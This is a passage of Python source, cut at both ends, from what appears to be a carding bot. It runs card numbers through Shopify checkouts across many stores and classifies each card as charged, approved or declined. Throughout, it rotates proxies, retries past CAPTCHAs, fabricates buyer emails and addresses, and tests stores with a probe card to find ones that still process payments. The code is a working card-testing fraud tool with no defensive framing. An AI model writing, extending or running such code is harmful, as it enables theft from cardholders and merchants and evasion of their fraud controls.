                            "insufficient_funds", "incorrect_cvc", "incorrect_number",
                            "expired_card", "approved", "charged",
                        ]
                        if any(marker in raw_lower for marker in working_markers):
                            logger.info(f"Site {url} → ✅ WORKING (text match)")
                            return True
                        logger.info(f"Site {url} → DEAD (unknown text: {raw[:120]})")
                        return False

                    api_response = str(data.get("Response", "")).upper()
                    api_status = data.get("Status", False)

                    # CAPTCHA — not usable
                    if "CAPTCHA" in api_response:
                        logger.info(f"Site {url} → DEAD (CAPTCHA)")
                        return False

                    # Dead site markers
                    dead_markers = [
                        "NOT_A_SHOPIFY", "STORE_CLOSED", "PASSWORD_PROTECTED",
                        "NO_PRODUCTS", "STORE_NOT_FOUND", "404",
                    ]
                    if any(marker in api_response for marker in dead_markers):
                        logger.info(f"Site {url} → DEAD ({api_response})")
                        return False

                    # Working: real payment response
                    working_markers = [
                        "CARD_DECLINED", "DECLINED", "DO_NOT_HONOR",
                        "INSUFFICIENT_FUNDS", "INCORRECT_CVC", "INCORRECT_NUMBER",
                        "EXPIRED_CARD", "LOST_CARD", "STOLEN_CARD", "FRAUDULENT",
                        "GENERIC_DECLINE", "PICKUP_CARD", "CARD_NOT_SUPPORTED",
                        "TRANSACTION_NOT_ALLOWED", "PAYMENTS_",
                        "ORDER_PLACED", "APPROVED", "OTP_REQUIRED",
                    ]
                    if any(m in api_response for m in working_markers):
                        logger.info(f"Site {url} → ✅ WORKING ({api_response})")
                        return True

                    if api_status:
                        logger.info(f"Site {url} → ✅ WORKING (Status=True, {api_response})")
                        return True

                    logger.info(f"Site {url} → DEAD (unknown: {api_response})")
                    return False

            except asyncio.TimeoutError:
                logger.info(f"Site {url} → DEAD (timeout after {SITE_VALIDATION_TIMEOUT}s)")
                return False
            except Exception as e:
                logger.info(f"Site {url} → DEAD (error: {e})")
                return False

    async def refresh_site_health(self):
        if not self.owner_sites:
            self.working_sites = []
            self.dead_sites = set()
            self._sites_ready = True
            return

        # FIX: enforce 500 site limit
        sites_to_check = self.owner_sites[:MAX_OWNER_SITES]
        if len(self.owner_sites) > MAX_OWNER_SITES:
            logger.warning(f"⚠️ {len(self.owner_sites)} sites loaded — capping at {MAX_OWNER_SITES}")

        logger.info(f"🔄 Checking {len(sites_to_check)} sites...")

        # Check all sites, wait full timeout per site, no skipping
        tasks = [self.validate_single_site(url) for url in sites_to_check]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        working = []
        dead = set()
        for url, res in zip(sites_to_check, results):
            if res is True:
                working.append(url)
            else:
                dead.add(url)

        self.working_sites = working
        self.dead_sites = dead
        self._sites_ready = True
        self.site_index = 0
        logger.info(f"✅ Site check done: {len(working)} WORKING (declined/charged), {len(dead)} DEAD")

    def _active_sites_snapshot(self) -> List[str]:
        if self.working_sites:
            return list(self.working_sites)
        return [s for s in self.owner_sites if s not in self.dead_sites]

    async def periodic_site_health_check(self):
        while True:
            await asyncio.sleep(SITE_CHECK_INTERVAL_HOURS * 3600)
            await self.refresh_site_health()

    # ═══════════════ Thread-safe Site Rotation ═══════════════
    async def get_next_site_async(self) -> Optional[str]:
        """Always use working_sites first, fallback to owner_sites. Thread-safe."""
        async with self._site_lock:
            sites = self._active_sites_snapshot()
            if not sites:
                return None
            site = sites[self.site_index % len(sites)]
            self.site_index = (self.site_index + 1) % len(sites)
            return site

    # Keep sync version for backwards compat (non-critical paths)
    def get_next_site(self) -> Optional[str]:
        sites = self.working_sites if self.working_sites else self.owner_sites
        if not sites:
            return None
        site = sites[self.site_index % len(sites)]
        self.site_index = (self.site_index + 1) % len(sites)
        return site

    async def mark_site_dead(self, site: str, reason: str = "", captcha: bool = False):
        """Mark a site as dead. If captcha=True, block temporarily (CAPTCHA_BLOCK_MINUTES) instead of permanently."""
        async with self._site_lock:
            if site in self.working_sites:
                self.working_sites = [s for s in self.working_sites if s != site]
                if self.site_index >= len(self.working_sites):
                    self.site_index = 0
            if captcha:
                # Temporary block — site recovers after cooldown
                self._captcha_blocked_sites[site] = time.time() + (CAPTCHA_BLOCK_MINUTES * 60)
            else:
                self.dead_sites.add(site)
        if reason:
            if captcha:
                logger.warning(f"⚠️ CAPTCHA-blocked site for {CAPTCHA_BLOCK_MINUTES}min: {site} ({reason})")
            else:
                logger.warning(f"⚠️ Marked site dead: {site} ({reason})")

    async def _unblock_captcha_sites(self):
        """Re-add CAPTCHA-blocked sites whose cooldown has expired back to working_sites."""
        now = time.time()
        unblocked = []
        async with self._site_lock:
            for site, unblock_time in list(self._captcha_blocked_sites.items()):
                if now >= unblock_time:
                    del self._captcha_blocked_sites[site]
                    if site not in self.dead_sites and site not in self.working_sites:
                        self.working_sites.append(site)
                        unblocked.append(site)
        if unblocked:
            logger.info(f"🔓 Unblocked {len(unblocked)} CAPTCHA sites: {', '.join(unblocked[:3])}...")

    def _shopify_response_indicates_dead_site(self, raw: str, info: dict) -> bool:
        msg = f"{raw or ''} {info.get('reason', '')}".lower()
        dead_markers = [
            "store not found", "shop not found", "invalid store", "store closed",
            "shop is closed", "store unavailable", "no products", "password protected",
            "coming soon", "page not found", "site dead", "not a shopify"
        ]
        return any(marker in msg for marker in dead_markers)

    # ═══════════════ Thread-safe Proxy Rotation (Latency-sorted) ═══════════════
    async def get_next_proxy_async(self, user_id: int) -> Optional[str]:
        """Thread-safe proxy rotation. Returns proxies sorted by latency (fastest first)."""
        lock = self._proxy_locks.setdefault(user_id, asyncio.Lock())
        async with lock:
            # Use latency-sorted list if available and fresh
            sorted_proxies = self._proxy_latency.get(user_id)
            last_update = self._proxy_latency_updated.get(user_id, 0)
            if sorted_proxies and (time.time() - last_update) < (PROXY_LATENCY_REFRESH_HOURS * 3600):
                proxies = [p for p, _ in sorted_proxies]
            else:
                proxies = self.user_proxies.get(user_id, [])
            if not proxies:
                return None
            if user_id not in self.proxy_index:
                self.proxy_index[user_id] = 0
            current_idx = self.proxy_index[user_id]
            proxy = proxies[current_idx % len(proxies)]
            self.proxy_index[user_id] = (current_idx + 1) % len(proxies)
            logger.info(f"🔄 User {user_id}: proxy {current_idx % len(proxies) + 1}/{len(proxies)}")
            return proxy

    # Keep sync version for non-concurrent paths
    def get_next_proxy(self, user_id: int) -> Optional[str]:
        proxies = self.user_proxies.get(user_id, [])
        if not proxies:
            return None
        if user_id not in self.proxy_index:
            self.proxy_index[user_id] = 0
        current_idx = self.proxy_index[user_id]
        proxy = proxies[current_idx % len(proxies)]
        self.proxy_index[user_id] = (current_idx + 1) % len(proxies)
        return proxy

    # ═══════════════ Proxy Handling ═══════════════
    def parse_proxy(self, proxy_str: str) -> Optional[Tuple[str, str, str, str]]:
        parts = proxy_str.split(':', 3)
        if len(parts) != 4:
            return None
        return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()

    async def is_proxy_working(self, proxy_str: str) -> bool:
        parsed = self.parse_proxy(proxy_str)
        if not parsed:
            return False
        host, port, user, pwd = parsed
        proxy_url = f"http://{user}:{pwd}@{host}:{port}"

        for attempt in range(PROXY_VALIDATION_RETRIES + 1):
            try:
                session = await self.get_http_session()
                async with session.get(
                    "https://api.ipify.org",
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=3)
                ) as resp:
                    return resp.status == 200
            except Exception as e:
                logger.debug(f"Proxy test failed ({attempt + 1}): {str(e)[:50]}")
                await asyncio.sleep(0.5)
        return False

    async def validate_proxies_batch(self, proxies: List[str], user_id: Optional[int] = None) -> List[str]:
        """Validate proxies and measure latency. Returns valid proxies sorted by latency (fastest first)."""
        sem = asyncio.Semaphore(PROXY_VALIDATION_CONCURRENCY)

        async def check_one_with_latency(p):
            async with sem:
                parsed = self.parse_proxy(p)
                if not parsed:
                    return p, False, 9999.0
                host, port, user, pwd = parsed
                proxy_url = f"http://{user}:{pwd}@{host}:{port}"
                for attempt in range(PROXY_VALIDATION_RETRIES + 1):
                    try:
                        session = await self.get_http_session()
                        start = time.time()
                        async with session.get(
                            "https://api.ipify.org",
                            proxy=proxy_url,
                            timeout=aiohttp.ClientTimeout(total=3)
                        ) as resp:
                            if resp.status == 200:
                                latency = (time.time() - start) * 1000  # ms
                                return p, True, latency
                    except Exception:
                        await asyncio.sleep(0.5)
                return p, False, 9999.0

        tasks = [check_one_with_latency(p) for p in proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        valid_with_latency = []
        for res in results:
            if isinstance(res, Exception):
                continue
            proxy_str, is_valid, latency = res
            if is_valid:
                valid_with_latency.append((proxy_str, latency))
        # Sort by latency (fastest first)
        valid_with_latency.sort(key=lambda x: x[1])
        valid_proxies = [p for p, _ in valid_with_latency]

        # Store latency-sorted list for this user
        if user_id is not None and valid_with_latency:
            self._proxy_latency[user_id] = valid_with_latency
            self._proxy_latency_updated[user_id] = time.time()
            self.proxy_index[user_id] = 0  # Reset to start from fastest
            logger.info(f"📊 Proxy latency sorted for user {user_id}: fastest={valid_with_latency[0][1]:.0f}ms, slowest={valid_with_latency[-1][1]:.0f}ms")

        return valid_proxies

    # ═══════════════ SHOPIFY ENTITY CHECKOUT ENGINE (Flask API) ═══════════════

    # ── Helpers ──

    def _generate_random_email(self) -> str:
        name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
        domain = random.choice(EMAIL_DOMAINS)
        return f"{name}@{domain}"

    def _get_address_for_country(self, country: str) -> ShopifyAddress:
        if country in COUNTRY_ADDRESSES:
            return COUNTRY_ADDRESSES[country]
        base = country[:2] if len(country) > 2 else country
        if base in COUNTRY_ADDRESSES:
            return COUNTRY_ADDRESSES[base]
        return COUNTRY_ADDRESSES["US"]

    @staticmethod
    def _convert_proxy_for_curl(proxy_str: str) -> Optional[str]:
        """Convert proxy string to http://user:pass@host:port with URL-quoted credentials."""
        if not proxy_str:
            return None
        p = proxy_str.strip()
        if "://" in p:
            return p
        parts = p.split(':', 3)
        if len(parts) == 4:
            host, port, user, pwd = [x.strip() for x in parts]
            # Validate port is numeric and in valid range
            if not port.isdigit() or not (0 < int(port) <= 65535):
                logger.warning(f"Invalid proxy port '{port}', skipping proxy")
                return None
            user_q = urllib.parse.quote(user, safe="")
            pwd_q = urllib.parse.quote(pwd, safe="")
            return f"http://{user_q}:{pwd_q}@{host}:{port}"
        if len(parts) == 2:
            host_part, port_part = parts[0].strip(), parts[1].strip()
            if not port_part.isdigit() or not (0 < int(port_part) <= 65535):
                logger.warning(f"Invalid proxy port '{port_part}', skipping proxy")
                return None
            return f"http://{host_part}:{port_part}"
        return f"http://{p}"

    # ── Amount filter helper ──
    @staticmethod
    def _is_price_in_filter(price: float, amount_filter: str) -> bool:
        """Check if a product price falls within the selected amount filter range."""
        if not amount_filter or amount_filter == "all":
            return True
        if amount_filter == "low":
            return price < 5.0
        elif amount_filter == "medium":
            return 5.0 <= price <= 10.0
        elif amount_filter == "high":
            return 10.0 < price <= 20.0
        return True

    async def rebuild_sites_by_filter(self, amount_filter: str):
        """Pre-filter the site list by amount filter using ONLY cached prices (instant).
        No live API calls — relies on prefetch_site_prices() having been run first."""
        self.current_amount_filter = amount_filter

        # Determine base site list: prefer good_sites, fallback to working_sites/owner_sites
        base_sites = list(self.good_sites) if self.good_sites else list(self.working_sites)
        if not base_sites:
            base_sites = [s for s in self.owner_sites if s not in self.dead_sites]

        if amount_filter == "all":
            self.working_sites = base_sites
            self.site_index = 0
            logger.info(f"[filter] Restored {len(self.working_sites)} sites (no filter)")
            return

        # FIX: Filter sites using ONLY cached prices — no live API calls
        filtered = []
        skipped_no_cache = 0
        for site in base_sites:
            price = self._site_price_cache.get(site, 0.0)
            if price > 0:
                if self._is_price_in_filter(price, amount_filter):
                    filtered.append(site)
            else:
                # No cached price — exclude from filtered list (warn, don't fetch)
                skipped_no_cache += 1

        if skipped_no_cache > 0:
            logger.warning(f"[filter] {skipped_no_cache} sites have no cached price — run /test_sites to populate cache")

        self.working_sites = filtered if filtered else base_sites
        self.site_index = 0
        logger.info(f"[filter] Filter '{amount_filter}': {len(filtered)} sites matched out of {len(base_sites)}")

    async def prefetch_site_prices(self):
        """Pre-fetch cheapest product prices for all working sites using the API with a test card.
        Populates self._site_price_cache for instant amount filtering."""
        sites = list(self.good_sites) if self.good_sites else list(self.working_sites)
        if not sites:
            return
        uncached = [s for s in sites if s not in self._site_price_cache]
        if not uncached:
            logger.info(f"[prefetch] All {len(sites)} sites already cached")
            return
        logger.info(f"[prefetch] Fetching prices for {len(uncached)} uncached sites...")
        sem = asyncio.Semaphore(SITE_TEST_CONCURRENCY_LIMIT)

        async def fetch_price(site):
            async with sem:
                try:
                    shop_url = self.normalize_site_url(site)
                    session = await self.get_http_session()
                    params = {"site": shop_url, "cc": SHOPIFY_TEST_CARD}
                    timeout = aiohttp.ClientTimeout(total=8)
                    async with session.get(SHOPIFY_API_URL, params=params, timeout=timeout) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            price = float(data.get("Price", 0.0)) if data.get("Price") else 0.0
                            if price > 0:
                                self._site_price_cache[site] = price
                                return
                except Exception:
                    pass
                # Fallback: try scraping products.json
                price = await self._fetch_product_price_fallback(site)
                if price and price > 0:
                    self._site_price_cache[site] = price

        tasks = [fetch_price(s) for s in uncached]
        await asyncio.gather(*tasks, return_exceptions=True)
        cached_count = sum(1 for s in sites if s in self._site_price_cache)
        logger.info(f"[prefetch] Price cache: {cached_count}/{len(sites)} sites have prices")

    async def _fetch_product_price_fallback(self, site: str) -> float:
        """Fallback: scrape cheapest product price via /products.json if API fails."""
        try:
            shop_url = self.normalize_site_url(site)
            url = f"{shop_url}/products.json?limit=1"
            session = await self.get_http_session()
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    products = data.get("products", [])
                    if products:
                        variants = products[0].get("variants", [])
                        if variants:
                            prices = [float(v.get("price", "0")) for v in variants if v.get("price")]
                            if prices:
                                return min(prices)
        except Exception:
            pass
        return 0.0

    # ── Flask API-based Shopify checkout ──

    async def run_shopify_graphql_checkout(self, card_line: str, shop_url: str,
                                            proxy_str: Optional[str] = None) -> ShopifyCheckResult:
        """Call the Flask API at SHOPIFY_API_URL for card checking.
        The API handles the entire Shopify GraphQL checkout flow internally.
        Returns ShopifyCheckResult with mapped status."""
        start_time = time.time()
        site_name = shop_url.replace("https://", "").replace("http://", "")

        # Build API request params
        params = {"site": shop_url, "cc": card_line}
        if proxy_str:
            params["proxy"] = proxy_str

        try:
            session = await self.get_http_session()
            timeout = aiohttp.ClientTimeout(total=SHOPIFY_API_TIMEOUT)
            async with session.get(SHOPIFY_API_URL, params=params, timeout=timeout) as resp:
                elapsed = time.time() - start_time

                if resp.status != 200:
                    error_text = await resp.text()
                    logger.warning(f"[API] {site_name} | HTTP {resp.status} | {elapsed:.2f}s | {error_text[:100]}")
                    return ShopifyCheckResult(
                        card=card_line, status=ShopifyCheckStatus.ERROR,
                        status_code=f"HTTP_{resp.status}", site_name=site_name,
                        shop_url=shop_url, gateway="SHOPIFY-RELOADED",
                        error_msg=f"API returned HTTP {resp.status}",
                        retryable=resp.status >= 500, site_dead=resp.status == 404,
                    )

                data = await resp.json()
                elapsed = time.time() - start_time

                api_status = data.get("Status", False)
                api_response = data.get("Response", "UNKNOWN")
                api_gateway = data.get("Gateway", "UNKNOWN")
                api_price = data.get("Price", 0.0)
                api_cc = data.get("cc", card_line)

                logger.info(f"[API] {site_name} | {api_response} | gate={api_gateway} | ${api_price} | {elapsed:.2f}s")

                # Map API response to ShopifyCheckStatus
                response_upper = api_response.upper() if api_response else ""

                # Determine if site is dead
                site_dead = False
                dead_markers = [
                    "NOT_A_SHOPIFY", "STORE_CLOSED", "PASSWORD_PROTECTED",
                    "NO_PRODUCTS", "STORE_NOT_FOUND", "404",
                    "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
                ]
                for marker in dead_markers:
                    if marker in response_upper:
                        site_dead = True
                        break

                # Determine status and retryable
                retryable = False
                if "CAPTCHA" in response_upper:
                    status = ShopifyCheckStatus.ERROR
                    retryable = True
                    site_dead = True
                elif site_dead:
                    status = ShopifyCheckStatus.ERROR
                    retryable = True
                elif "GENERIC_ERROR" in response_upper:
                    # GENERIC_ERROR must NEVER be treated as APPROVED
                    status = ShopifyCheckStatus.DECLINED
                elif api_status and any(kw in response_upper for kw in [
                    "ORDER_PLACED", "PROCESSED_RECEIPT",
                ]):
                    status = ShopifyCheckStatus.CHARGED
                elif api_status and any(kw in response_upper for kw in [
                    "INSUFFICIENT_FUNDS", "OTP_REQUIRED", "3DS_AUTHENTICATION",
                    "3D_SECURE", "AUTHENTICATION_REQUIRED", "ACTION_REQUIRED",
                    "APPROVED",
                ]):
                    status = ShopifyCheckStatus.APPROVED
                elif "TIMEOUT" in response_upper or "CONNECTION" in response_upper:
                    status = ShopifyCheckStatus.ERROR
                    retryable = True
                else:
                    # Everything else is DECLINED: CARD_DECLINED, DO_NOT_HONOR,
                    # DELIVERY_*, GENERIC_DECLINE, PAYMENTS_*, unknown, etc.
                    status = ShopifyCheckStatus.DECLINED

                result = ShopifyCheckResult(
                    card=card_line,
                    status=status,
                    status_code=api_response,
                    amount=str(api_price) if api_price else "0.00",
                    currency="USD",
                    site_name=site_name,
                    shop_url=shop_url,
                    gateway=api_gateway or "SHOPIFY-RELOADED",
                    error_msg=api_response if status == ShopifyCheckStatus.ERROR else "",
                    retryable=retryable,
                    site_dead=site_dead,
                )
                result.product_price = float(api_price) if api_price else 0.0
                return result

        except asyncio.TimeoutError:
            elapsed = time.time() - start_time
            logger.warning(f"[API] {site_name} | TIMEOUT after {elapsed:.2f}s")
            return ShopifyCheckResult(
                card=card_line, status=ShopifyCheckStatus.ERROR,
                status_code="API_TIMEOUT", site_name=site_name,
                shop_url=shop_url, gateway="SHOPIFY-RELOADED",
                error_msg=f"API timeout after {elapsed:.1f}s",
                retryable=True, site_dead=False,
            )
        except aiohttp.ClientError as e:
            elapsed = time.time() - start_time
            logger.error(f"[API] {site_name} | CONNECTION ERROR after {elapsed:.2f}s | {e}")
            return ShopifyCheckResult(
                card=card_line, status=ShopifyCheckStatus.ERROR,
                status_code="API_CONNECTION_ERROR", site_name=site_name,
                shop_url=shop_url, gateway="SHOPIFY-RELOADED",
                error_msg=f"API connection error: {str(e)[:80]}",
                retryable=True, site_dead=False,
            )
        except Exception as e:
            elapsed = time.time() - start_time
            logger.error(f"[API] {site_name} | UNEXPECTED ERROR after {elapsed:.2f}s | {e}")
            return ShopifyCheckResult(
                card=card_line, status=ShopifyCheckStatus.ERROR,
                status_code="API_ERROR", site_name=site_name,
                shop_url=shop_url, gateway="SHOPIFY-RELOADED",
                error_msg=f"API error: {str(e)[:80]}",
                retryable=True, site_dead=False,
            )

    # ── Shopify check card — site failover wrapper ──

    async def shopify_check_card(self, card_line: str, proxy_str: Optional[str] = None,
                                 user_id: Optional[int] = None,
                                 amount_filter: str = "all") -> Tuple[str, bool, dict]:
        """Wrapper that runs the Shopify Reloaded V2 checkout with site failover and CAPTCHA retry.
        Dead sites (password/closed/missing tokens) are marked dead immediately and skipped.
        CAPTCHA sites are retried up to MAX_CAPTCHA_RETRIES times with different proxy/fingerprint.
        Amount filter: only uses sites whose cheapest product price matches the user's filter.
        Returns (raw_text, approved, info) for compatibility with existing callers."""
        if not self.working_sites:
            # Fallback: try owner_sites minus dead ones
            fallback_sites = [s for s in self.owner_sites if s not in self.dead_sites]
            if fallback_sites:
                logger.warning(f"⚠️ shopify_check_card: working_sites empty, using {len(fallback_sites)} owner_sites as fallback")
                self.working_sites = fallback_sites
                self.site_index = 0
            else:
                logger.error("❌ shopify_check_card: NO sites available (all dead)")
                return "No sites", False, {"reason": "No working Shopify sites available (all dead)", "site": "none"}

        tried = set()
        last_info: dict = {"reason": "No sites tried", "site": "none"}
        captcha_retries = 0
        attempt_count = 0  # counts only real attempts (non-dead sites)
        max_real_attempts = 3  # max card check attempts (non-dead)
        max_site_tries = 5  # upper bound to prevent infinite loop

        for _ in range(max_site_tries):
            if attempt_count >= max_real_attempts:
                break

            site = await self.get_next_site_async()
            if not site or site in tried:
                continue
            tried.add(site)

            # On CAPTCHA retry: rotate proxy if available, wait 1-2 seconds
            current_proxy = proxy_str
            if captcha_retries > 0:
                await asyncio.sleep(random.uniform(1.0, 2.0))
                if user_id and self.user_proxies.get(user_id):
                    rotated = await self.get_next_proxy_async(user_id)
                    if rotated:
                        current_proxy = rotated

            shop_url = self.normalize_site_url(site)
            result = await self.run_shopify_graphql_checkout(card_line, shop_url, current_proxy)

            info = {
                "site": result.site_name,
                "amount": result.amount,
                "gate": result.gateway,
                "reason": result.status_code or result.error_msg or "Unknown",
                "currency": result.currency,
            }
            if current_proxy:
                info["proxy"] = current_proxy

            # Dead-site: mark dead and skip immediately (do NOT count as attempt)
            if result.site_dead:
                dead_reason = result.error_msg or result.status_code or "dead site"
                await self.mark_site_dead(site, dead_reason)
                last_info = info
                continue  # skip without incrementing attempt_count

            # FIX: No per-card price re-check — sites are already pre-filtered
            # by rebuild_sites_by_filter() using cached prices. This eliminates
            # per-card delays from live price checks.

            # CAPTCHA detection
            err_lower = (result.error_msg or "").lower()
            reason_lower = (result.status_code or "").lower()
            is_captcha = "captcha_required" in err_lower or "captcha_required" in reason_lower or "captcha" in err_lower

            if is_captcha:
                await self.mark_site_dead(site, "CAPTCHA_REQUIRED", captcha=True)
                if captcha_retries < MAX_CAPTCHA_RETRIES:
                    captcha_retries += 1
                    logger.warning(f"CAPTCHA on {site}, retry {captcha_retries}/{MAX_CAPTCHA_RETRIES}")
                    last_info = info
                    continue  # retry with new site/proxy/fingerprint
                # All CAPTCHA retries exhausted — return declined
                info["approved"] = False
                return "DECLINED", False, info

            # Count this as a real attempt
            attempt_count += 1

            # Other dead markers
            dead_markers = [
                "not a shopify store", "password protected", "store closed",
                "no products", "no available products", "page not found",
            ]
            if any(m in err_lower or m in reason_lower for m in dead_markers):
                dead_reason = result.error_msg or result.status_code or "dead marker match"
                await self.mark_site_dead(site, dead_reason)

            if result.status == ShopifyCheckStatus.CHARGED:
                info["approved"] = True
                info["reason"] = f"CHARGED ${result.amount} {result.currency}"
                return "CHARGED", True, info
            elif result.status == ShopifyCheckStatus.APPROVED:
                info["approved"] = True
                info["reason"] = result.status_code
                return "APPROVED", True, info
            elif result.status == ShopifyCheckStatus.DECLINED:
                info["approved"] = False
                return "DECLINED", False, info
            else:
                # Other ERROR — retry with a different site if retryable
                if result.retryable:
                    last_info = info
                    continue
                info["approved"] = False
                return "ERROR", False, info

        return "All sites failed", False, last_info

    # ── Legacy API compatibility wrappers ──

    async def call_shopify_api_vps(self, card_line: str) -> Tuple[str, bool, dict]:
        return await self.shopify_check_card(card_line, proxy_str=None)

    async def call_shopify_api_proxy(self, card_line: str, proxy_str: str) -> Tuple[str, bool, dict]:
        return await self.shopify_check_card(card_line, proxy_str=proxy_str)

    async def call_shopify_api_for_site(self, card_line: str, site: str, proxy_str: Optional[str] = None) -> Tuple[str, bool, dict]:
        """Direct single-site check (no rotation)."""
        shop_url = self.normalize_site_url(site)
        result = await self.run_shopify_graphql_checkout(card_line, shop_url, proxy_str)
        info = {
            "site": result.site_name,
            "amount": result.amount,
            "gate": result.gateway,
            "reason": result.status_code or result.error_msg or "Unknown",
            "currency": result.currency,
        }
        if proxy_str:
            info["proxy"] = proxy_str
        if result.status == ShopifyCheckStatus.CHARGED:
            info["approved"] = True
            info["reason"] = f"CHARGED ${result.amount} {result.currency}"
            return "CHARGED", True, info
        elif result.status == ShopifyCheckStatus.APPROVED:
            info["approved"] = True
            info["reason"] = result.status_code
            return "APPROVED", True, info
        elif result.status == ShopifyCheckStatus.DECLINED:
            info["approved"] = False
            return "DECLINED", False, info
        info["approved"] = False
        return "ERROR", False, info

    # ── API-based site validator ──

    async def _test_site_via_api(self, shop_url: str) -> dict:
        """Test a single site by sending a test card to the Flask API.
        A site is WORKING if the API returns any real payment gateway response
        (e.g. CARD_DECLINED, INSUFFICIENT_FUNDS, etc.).
        Returns dict with 'working' (bool), 'reason' (str), 'site' (str), 'captcha' (bool)."""
        start_time = time.time()
        site_name = shop_url.replace("https://", "").replace("http://", "")
        out = {"working": False, "reason": "", "site": site_name, "captcha": False}

        try:
            session = await self.get_http_session()
            params = {"site": shop_url, "cc": SHOPIFY_TEST_CARD}
            timeout = aiohttp.ClientTimeout(total=SHOPIFY_TEST_SITE_TIMEOUT)
            async with session.get(SHOPIFY_API_URL, params=params, timeout=timeout) as resp:
                elapsed = time.time() - start_time

                if resp.status != 200:
                    out["reason"] = f"HTTP {resp.status} after {elapsed:.1f}s"
                    return out

                data = await resp.json()
                api_response = data.get("Response", "")
                api_status = data.get("Status", False)
                api_gateway = data.get("Gateway", "UNKNOWN")
                response_upper = api_response.upper() if api_response else ""

                logger.info(f"[site-test] {site_name} | {api_response} | gate={api_gateway} | {elapsed:.1f}s")

                # CAPTCHA detection
                if "CAPTCHA" in response_upper:
                    out["captcha"] = True
                    out["reason"] = f"CAPTCHA ({api_response})"
                    return out

                # Dead site markers
                dead_markers = [
                    "NOT_A_SHOPIFY", "STORE_CLOSED", "PASSWORD_PROTECTED",
                    "NO_PRODUCTS", "STORE_NOT_FOUND", "404",
                    "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
                ]
                for marker in dead_markers:
                    if marker in response_upper:
                        out["reason"] = f"Dead: {api_response}"
                        return out

                # BAD site markers: responses that mean the site is not useful for checking
                bad_markers = [
                    "GENERIC_ERROR", "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
                ]
                for marker in bad_markers:
                    if marker in response_upper:
                        out["reason"] = f"Bad: {api_response}"
                        out["bad_site"] = True
                        return out

                # GOOD markers: real payment gateway responses that confirm site processes payments
                good_markers = [
                    "CARD_DECLINED", "DO_NOT_HONOR",
                    "INSUFFICIENT_FUNDS", "INCORRECT_CVC", "INCORRECT_NUMBER",
                    "EXPIRED_CARD", "LOST_CARD", "STOLEN_CARD", "FRAUDULENT",
                    "GENERIC_DECLINE", "PICKUP_CARD", "CARD_NOT_SUPPORTED",
                    "TRANSACTION_NOT_ALLOWED",
                    "ORDER_PLACED", "APPROVED", "OTP_REQUIRED",
                    "3DS_AUTHENTICATION", "3D_SECURE", "AUTHENTICATION_REQUIRED",
                    "ACTION_REQUIRED",
                ]
                if any(m in response_upper for m in good_markers):
                    out["working"] = True
                    out["good"] = True
                    out["reason"] = f"OK: {api_response} via {api_gateway}"
                    out["price"] = data.get("Price", 0.0)
                    return out

                # Working markers: broader set (includes PAYMENTS_*, DECLINED, etc.)
                working_markers = [
                    "DECLINED", "PAYMENTS_",
                ]
                if any(m in response_upper for m in working_markers):
                    out["working"] = True
                    out["reason"] = f"OK: {api_response} via {api_gateway}"
                    out["price"] = data.get("Price", 0.0)
                    return out

                # Status=True but unknown response: treat as working
                if api_status:
                    out["working"] = True
                    out["reason"] = f"Status=True: {api_response}"
                    return out

                # Otherwise: failed
                out["reason"] = f"Unknown response: {api_response}"
                return out

        except asyncio.TimeoutError:
            elapsed = time.time() - start_time
            out["reason"] = f"Timeout ({elapsed:.1f}s)"
            return out
        except aiohttp.ClientError as e:
            out["reason"] = f"Connection error: {str(e)[:60]}"
            return out
        except Exception as e:
            out["reason"] = f"Error: {type(e).__name__}: {str(e)[:60]}"
            return out

    async def test_sites_graphql(self, sites: Optional[List[str]] = None) -> Tuple[List[str], List[str]]:
        """Test all sites CONCURRENTLY using the Flask API with a test card. Returns (working, dead) lists.
        Uses asyncio.gather with semaphore for fast parallel testing.
        503/timeout errors get SITE_TEST_RETRIES retries before marking dead.
        CAPTCHA sites are NOT counted as working.
        Also classifies GOOD sites (real payment responses only, no GENERIC_ERROR/DELIVERY_*)."""
        sites_to_test = sites or list(self.owner_sites)
        working = []
        good_sites = []
        dead = []
        captcha_sites = []
        failure_reasons = {}
        sem = asyncio.Semaphore(SITE_TEST_CONCURRENCY_LIMIT)
        results_lock = asyncio.Lock()

        async def test_one_site(site):
            async with sem:
                shop_url = self.normalize_site_url(site)
                last_reason = "unknown"
                # Try up to SITE_TEST_RETRIES + 1 times for 503/timeout errors
                for attempt in range(SITE_TEST_RETRIES + 1):
                    try:
                        result = await self._test_site_via_api(shop_url)
                        if result.get("working"):
                            async with results_lock:
                                working.append(site)
                                if result.get("good"):
                                    good_sites.append(site)
                                    price = result.get("price", 0.0)
                                    if price and price > 0:
                                        self._site_price_cache[site] = float(price)
                            logger.info(f"✅ {result['site']} → WORKING{' (GOOD)' if result.get('good') else ''} ({result.get('reason', '')})")
                            return
                        elif result.get("captcha"):
                            async with results_lock:
                                captcha_sites.append(site)
                                dead.append(site)
                                failure_reasons[site] = f"CAPTCHA: {result.get('reason', 'captcha detected')}"
                            logger.info(f"⚠️ {result['site']} → CAPTCHA (unusable)")
                            return
                        elif result.get("bad_site"):
                            async with results_lock:
                                dead.append(site)
                                failure_reasons[site] = result.get("reason", "bad site")
                            logger.info(f"⚠️ {result['site']} → BAD SITE ({result.get('reason', '')})")
                            return
                        else:
                            last_reason = result.get("reason", "unknown")
                            # Check if it's a 503/timeout — retry with delay
                            reason_str = last_reason.lower()
                            if any(kw in reason_str for kw in ["503", "timeout", "connection error"]):
                                if attempt < SITE_TEST_RETRIES:
                                    await asyncio.sleep(SITE_TEST_RETRY_DELAY)
                                    continue
                            # Not a retryable error — retry once more then give up
                            if attempt == 0:
                                await asyncio.sleep(1)
                                continue
                            # All retries exhausted
                            async with results_lock:
                                dead.append(site)
                                failure_reasons[site] = last_reason
                            logger.info(f"❌ {result['site']} → DEAD after {attempt + 1} attempts ({last_reason})")
                            return
                    except Exception as e:
                        last_reason = f"exception: {str(e)[:60]}"
                        if attempt < SITE_TEST_RETRIES:
